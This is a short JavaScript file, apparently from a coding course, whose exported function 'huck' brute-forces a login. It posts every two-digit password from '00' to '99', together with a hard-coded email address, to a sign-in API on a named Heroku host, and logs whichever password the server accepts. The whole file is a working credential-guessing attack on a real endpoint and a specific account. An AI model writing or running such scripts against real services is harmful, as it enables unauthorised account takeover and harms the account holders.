
async function handleSubmit(password, email){
    const response = await fetch(
        'https://tms-js-pro-back-end.herokuapp.com/api/users/signin',
        {
        method: 'POST',
        headers: {
            Accept: 'application/json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
        },
    );
    if(response.ok){
        console.log(password)
    }
}

const userEmail = "alesyad@mail.com";

export default function huck(){
    let userPassword;
    for(let i = 0; i < 100; i++){
        if(i < 10 ){
            userPassword = `0${String(i)}`
        }else {
            userPassword = String(i);
        }
        handleSubmit(userPassword, userEmail) 
    }
}
